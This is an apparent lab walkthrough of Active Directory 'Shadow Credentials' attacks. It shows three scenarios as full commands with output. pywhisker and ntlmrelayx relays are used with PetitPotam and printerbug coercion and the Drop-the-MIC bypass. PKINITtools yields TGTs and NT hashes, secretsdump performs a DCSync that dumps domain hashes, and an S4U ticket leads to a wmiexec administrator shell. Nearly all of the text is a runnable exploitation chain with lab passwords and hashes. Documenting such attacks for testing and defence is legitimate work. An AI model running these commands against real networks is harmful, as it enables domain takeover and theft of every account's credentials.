# Shadow Credentials

## tips
1. use python3.8
2. use the `-dc-ip` flag to point to the domain controller

## Scenario #1
- domain: lab.local
- ADCS: present and required for PKINIT
- user: sysadmin
- group membership: key admins
- privilege: AddKeyCredentialLink over Domain Controller: DC$

## Step #1: List key credentials
listing the keys on the DC. the out gives an either/or answer so we should try going for it

### Command
```bash
python3.8 pywhisker.py -v --dc-ip dc -d lab.local -u sysadmin -p 'Abc123!!' --target 'dc$' --action list
```
### Output
```
[*] Searching for the target account
[*] Target user found: CN=DC,OU=Domain Controllers,DC=LAB,DC=local
[*] Attribute msDS-KeyCredentialLink is either empty or user does not have read permissions on that attribute
```

## Step #2: Add key credentials

### Command
```bash
python3.8 pywhisker.py -v --dc-ip dc -d lab.local -u sysadmin -p 'Abc123!!' --target 'dc$' --action add
```
### Output
```
[*] Searching for the target account
[*] Target user found: CN=DC,OU=Domain Controllers,DC=LAB,DC=local
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: e3550b17-9746-d819-99eb-0d907c12922d
[*] Updating the msDS-KeyCredentialLink attribute of dc$
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[VERBOSE] No filename was provided. The certificate(s) will be stored with the filename: dnUC8Y14
[VERBOSE] No pass was provided. The certificate will be stored with the password: cCw1PLYcsQsUJggLshDq
[+] Saved PFX (#PKCS12) certificate & key at path: dnUC8Y14.pfx
[*] Must be used with password: cCw1PLYcsQsUJggLshDq
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
[VERBOSE] Run the following command to obtain a TGT
[VERBOSE] python3 PKINITtools/gettgtpkinit.py -cert-pfx dnUC8Y14.pfx -pfx-pass cCw1PLYcsQsUJggLshDq lab.local/dc$ dnUC8Y14.ccache
```

## Step #3: Getting TGT
using PKINIT, we request a TGT

### Command
```bash
python3.8 /opt/PKINITtools/gettgtpkinit.py -v -dc-ip dc -cert-pfx dnUC8Y14.pfx -pfx-pass cCw1PLYcsQsUJggLshDq lab.local/dc$ dnUC8Y14.ccache
```

### Output
```
2022-07-05 05:58:06,827 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2022-07-05 05:58:06,841 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2022-07-05 05:58:18,909 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2022-07-05 05:58:18,909 minikerberos INFO     5f35c60f52a4aa68fedf4673b70b6b9f08ca8a494031fbb361b2302954c1969f
INFO:minikerberos:5f35c60f52a4aa68fedf4673b70b6b9f08ca8a494031fbb361b2302954c1969f
2022-07-05 05:58:18,912 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

## Step #4: Getting NT HASH
using the key generated in Step #3 and exporting the generated TGT into our kerberos cache, we're going to get the NTLM hash for the DC :D

### Command
```bash
export KRB5CCNAME=dnUC8Y14.ccache
python3.8 /opt/PKINITtools/getnthash.py -dc-ip dc lab.local/'DC$' -key 5f35c60f52a4aa68fedf4673b70b6b9f08ca8a494031fbb361b2302954c1969f
```

### Output
```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
8028aac845cdc82881b55e1d0b1c88e5
```

## Step #5: Dumping NTDS.dit
hashes. hashes everwhere

### Command:
```bash
secretsdump.py -just-dc-ntlm -dc-ip dc lab.local/'DC$'@dc.lab.local -hashes :8028aac845cdc82881b55e1d0b1c88e5
```

### Output:
```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ae8953772e3b34f7fcba87c9a2d747f3:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:eff164ce8ed0ac98cb7520c4de7dfc0b:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
LAB.local\FSAdmin:1104:aad3b435b51404eeaad3b435b51404ee:ae8953772e3b34f7fcba87c9a2d747f3:::
LAB.local\Regular:1106:aad3b435b51404eeaad3b435b51404ee:ae8953772e3b34f7fcba87c9a2d747f3:::
LAB.local\SysAdmin:1107:aad3b435b51404eeaad3b435b51404ee:ae8953772e3b34f7fcba87c9a2d747f3:::
LAB.local\JohnSmith:1108:aad3b435b51404eeaad3b435b51404ee:ae8953772e3b34f7fcba87c9a2d747f3:::
LAB.local\NewUser:1113:aad3b435b51404eeaad3b435b51404ee:ae8953772e3b34f7fcba87c9a2d747f3:::
DcpnYhFXlO:1117:aad3b435b51404eeaad3b435b51404ee:565cae8a079a5078163bc7969d132b9b:::
PoCOUBzGGU:1118:aad3b435b51404eeaad3b435b51404ee:1713981fe06cd340348300f7500befcf:::
john:1123:aad3b435b51404eeaad3b435b51404ee:98da674948a73eb2cfa124e9aca27a03:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:8028aac845cdc82881b55e1d0b1c88e5:::
CLIENT1$:1105:aad3b435b51404eeaad3b435b51404ee:43ca831bd985a0e64297f7799b39660b:::
FS$:1115:aad3b435b51404eeaad3b435b51404ee:995c9d47bb2bf0ff113b525d38cae2e1:::
HZBDQHVP$:1116:aad3b435b51404eeaad3b435b51404ee:38ae9e7ea8d9ab0f07982baac9e11b48:::
SFDRQNQH$:1119:aad3b435b51404eeaad3b435b51404ee:094a2d83f66f017ccd989a024e7bceee:::
JWHMHWBU$:1120:aad3b435b51404eeaad3b435b51404ee:53fb78699467a971ee2a51109afcf7e2:::
gmsa1$:1122:aad3b435b51404eeaad3b435b51404ee:2be99b0ca6594829276aaf74358624b8:::
[*] Cleaning up... 
```

## (Optional) Step #6: Removing the msDS-KeyCredentialLink
you will need the device GUID for this step --> it's provided in the output of the command in step #1

### Command
```bash
python3.8 pywhisker.py --dc-ip dc -d 'lab.local' -u 'sysadmin' -p 'Abc123!!' --target 'DC$' --action remove --device-id 'e3550b17-9746-d819-99eb-0d907c12922d'
```

### Output
```
[*] Searching for the target account
[*] Target user found: CN=DC,OU=Domain Controllers,DC=LAB,DC=local
[*] Found value to remove
[*] Updating the msDS-KeyCredentialLink attribute of DC$
[+] Updated the msDS-KeyCredentialLink attribute of the target object
```

---

# Scenario #2: Coercing authentication from DC3 to DC1 using petitpotam to Secure LDAP using Drop the MIC to bypass LDAP signing and set an `msDS-KeyCredentialLink` on DC3

## Step #1: setting up ntlmrelayx

### Command:
```bash
python3 /opt/impacket/examples/ntlmrelayx.py -t ldaps://dc.lab.local --shadow-credentials --shadow-target 'dc3$' --remove-mic
```

### Output:
```
Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation

[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client SMTP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666
```

## Step #2: coercing authentication using petitpotam from DC3 to DC

### Command:
```bash
python3.8 PetitPotam.py -d lab.local -u 'johnsmith' -p 'Abc123!!' 20.20.20.129 dc3.lab.local
```

### Output #1: on petitpotam.py's end
```                                                                                            
              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                         
              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN



Trying pipe lsarpc
[-] Connecting to ncacn_np:dc3.lab.local[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

### Output #2: On ntlmrelayx's end (contains the Device-ID, saves the `.pfx` and its password)
```
[*] Servers started, waiting for connections
[*] SMBD-Thread-5 (process_request_thread): Received connection from 20.20.20.101, attacking target ldaps://dc.lab.local
[*] Authenticating against ldaps://dc.lab.local as LAB/DC3$ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] SMBD-Thread-7 (process_request_thread): Connection from 20.20.20.101 controlled, but there are no more targets left!
[*] Searching for the target account
[*] Target user found: CN=DC3,OU=Domain Controllers,DC=LAB,DC=local
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: e624b4b2-60f0-3fcd-270b-43538c66e2f1
[*] Updating the msDS-KeyCredentialLink attribute of dc3$
[*] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Saved PFX (#PKCS12) certificate & key at path: jtJLaz4a.pfx
[*] Must be used with password: Vo9c1yWCQYmkx3QgxQNU
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
[*] Run the following command to obtain a TGT
[*] python3 PKINITtools/gettgtpkinit.py -cert-pfx jtJLaz4a.pfx -pfx-pass Vo9c1yWCQYmkx3QgxQNU LAB.local/dc3$ jtJLaz4a.ccache
```

## Step #3: genering a TGT from the pfx file and outputting a ccache file

### Command:
```bash
python3.8 /opt/PKINITtools/gettgtpkinit.py -dc-ip dc -cert-pfx jtJLaz4a.pfx -pfx-pass Vo9c1yWCQYmkx3QgxQNU LAB.local/dc3$ jtJLaz4a.ccache
```

### Output: contains the AES encryption key
```
2022-07-05 10:22:18,336 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2022-07-05 10:22:18,349 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2022-07-05 10:22:29,356 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2022-07-05 10:22:29,356 minikerberos INFO     2eb9989bfaae279c41e107b5f19e68dfbfbafc1dab52c11b46f46f9678a133b7
INFO:minikerberos:2eb9989bfaae279c41e107b5f19e68dfbfbafc1dab52c11b46f46f9678a133b7
2022-07-05 10:22:29,358 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

## Step #4: exporting the TGT and use it to gain the NTLM hash

### Command:
```bash
export KRB5CCNAME=/lab/jtJLaz4a.ccache
python3.8 /opt/PKINITtools/getnthash.py -dc-ip dc lab.local/'DC3$' -key 2eb9989bfaae279c41e107b5f19e68dfbfbafc1dab52c11b46f46f9678a133b7
```

### Output:
```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
eea801dbf0ec0bde518227a1973efe99
```

## Step #5: DCSYNC

### Command:
```bash
secretsdump.py -dc-ip dc3 lab.local/'DC3$'@dc3.lab.local -hashes :eea801dbf0ec0bde518227a1973efe99 -just-dc-ntlm
```

### Output:
```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ae8953772e3b34f7fcba87c9a2d747f3:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:eff164ce8ed0ac98cb7520c4de7dfc0b:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
LAB.local\FSAdmin:1104:aad3b435b51404eeaad3b435b51404ee:ae8953772e3b34f7fcba87c9a2d747f3:::
LAB.local\Regular:1106:aad3b435b51404eeaad3b435b51404ee:ae8953772e3b34f7fcba87c9a2d747f3:::
LAB.local\SysAdmin:1107:aad3b435b51404eeaad3b435b51404ee:ae8953772e3b34f7fcba87c9a2d747f3:::
LAB.local\JohnSmith:1108:aad3b435b51404eeaad3b435b51404ee:ae8953772e3b34f7fcba87c9a2d747f3:::
LAB.local\NewUser:1113:aad3b435b51404eeaad3b435b51404ee:ae8953772e3b34f7fcba87c9a2d747f3:::
DcpnYhFXlO:1117:aad3b435b51404eeaad3b435b51404ee:565cae8a079a5078163bc7969d132b9b:::
PoCOUBzGGU:1118:aad3b435b51404eeaad3b435b51404ee:1713981fe06cd340348300f7500befcf:::
john:1123:aad3b435b51404eeaad3b435b51404ee:98da674948a73eb2cfa124e9aca27a03:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:8028aac845cdc82881b55e1d0b1c88e5:::
CLIENT1$:1105:aad3b435b51404eeaad3b435b51404ee:43ca831bd985a0e64297f7799b39660b:::
FS$:1115:aad3b435b51404eeaad3b435b51404ee:995c9d47bb2bf0ff113b525d38cae2e1:::
HZBDQHVP$:1116:aad3b435b51404eeaad3b435b51404ee:38ae9e7ea8d9ab0f07982baac9e11b48:::
SFDRQNQH$:1119:aad3b435b51404eeaad3b435b51404ee:094a2d83f66f017ccd989a024e7bceee:::
JWHMHWBU$:1120:aad3b435b51404eeaad3b435b51404ee:53fb78699467a971ee2a51109afcf7e2:::
gmsa1$:1122:aad3b435b51404eeaad3b435b51404ee:2be99b0ca6594829276aaf74358624b8:::
DC3$:1124:aad3b435b51404eeaad3b435b51404ee:eea801dbf0ec0bde518227a1973efe99:::
[*] Cleaning up...
```

---

# Scenario #3: workstation takeover (Machine FS in the example)

## Step #1: Setting up NTLM relay with shadow credentials + Drop the MIC attack (CVE-2019-1040) to bypass secure LDAP signing

## Command
```bash
python3 /opt/impacket/examples/ntlmrelayx.py -t ldaps://dc.lab.local --shadow-credentials --shadow-target 'FS$' --remove-mic
```

## Output:
```
Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation

[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client SMTP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666
```

## Step #2: Coercing authentication using printerbug

## Command:
```bash
python3 printerbug.py lab.local/johnsmith:'Abc123!!'@fs.lab.local 20.20.20.129
```

## Output #1: from printerbug.py
```
[*] Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation

[*] Attempting to trigger authentication via rprn RPC at fs.lab.local
[*] Bind OK
[*] Got handle
RPRN SessionError: code: 0x6ba - RPC_S_SERVER_UNAVAILABLE - The RPC server is unavailable.
[*] Triggered RPC backconnect, this may or may not have worked
```

## Output #2: from ntlmrelayx (contains necessary info for the upcoming phases)
```
[*] Servers started, waiting for connections
[*] SMBD-Thread-5 (process_request_thread): Received connection from 20.20.20.50, attacking target ldaps://dc.lab.local
[*] Authenticating against ldaps://dc.lab.local as LAB/FS$ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] SMBD-Thread-7 (process_request_thread): Connection from 20.20.20.50 controlled, but there are no more targets left!
[*] Searching for the target account
[*] Target user found: CN=FS,CN=Computers,DC=LAB,DC=local
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 5c3241d0-1ebc-4619-5244-ab55fcd15b41
[*] Updating the msDS-KeyCredentialLink attribute of FS$
[*] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Saved PFX (#PKCS12) certificate & key at path: FW7sA8yE.pfx
[*] Must be used with password: bjL518WrteXnPTCAH93r
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
[*] Run the following command to obtain a TGT
[*] python3 PKINITtools/gettgtpkinit.py -cert-pfx FW7sA8yE.pfx -pfx-pass bjL518WrteXnPTCAH93r LAB.local/FS$ FW7sA8yE.ccache
```

## Step #3: Getting a TGT for FS$

## Command:
```bash
python3.8 /opt/PKINITtools/gettgtpkinit.py -dc-ip dc -cert-pfx FW7sA8yE.pfx -pfx-pass bjL518WrteXnPTCAH93r LAB.local/FS$ FW7sA8yE.ccache
```

## Output
```
2022-07-05 08:56:34,475 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2022-07-05 08:56:34,489 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2022-07-05 08:56:46,263 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2022-07-05 08:56:46,263 minikerberos INFO     6d6dadc8fd4fac31b4b1a1bb7eb9347907f5f371431de4fab55f77510789fc99
INFO:minikerberos:6d6dadc8fd4fac31b4b1a1bb7eb9347907f5f371431de4fab55f77510789fc99
2022-07-05 08:56:46,266 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

## Step #4: Getting a TGS for a high-privilege account (ex: Domain Administrator)

## Command: using the TGT from step #3 to obtain a CIFS silver ticket as administrator on our FS$ target machine
```bash
python3.8 /opt/PKINITtools/gets4uticket.py -v kerberos+ccache://lab.local\\fs\$:FW7sA8yE.ccache@dc.lab.local cifs/fs.lab.local@lab.local administrator@lab.local administrator-fs-tgs.ccache
```

## Output: TGS generated in a ccache file `administrator-fs-tgs.ccache`
```
2022-07-05 09:38:14,976 minikerberos INFO     Trying to get SPN with administrator@lab.local for cifs/fs.lab.local@lab.local
INFO:minikerberos:Trying to get SPN with administrator@lab.local for cifs/fs.lab.local@lab.local
2022-07-05 09:38:14,982 minikerberos INFO     Success!
INFO:minikerberos:Success!
2022-07-05 09:38:14,982 minikerberos INFO     Done!
INFO:minikerberos:Done!
```

## Step #5: exporting the TGS to the kerberos cache and passing it to gain access to FS$ as Administrator

## Command:
```bash
export KRB5CCNAME=/lab/administrator-fs-tgs.ccache
python3 /opt/impacket/examples/wmiexec.py -k -no-pass lab.local/administrator@fs.lab.local
```
## Output
```
Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
lab\administrator

C:\>
```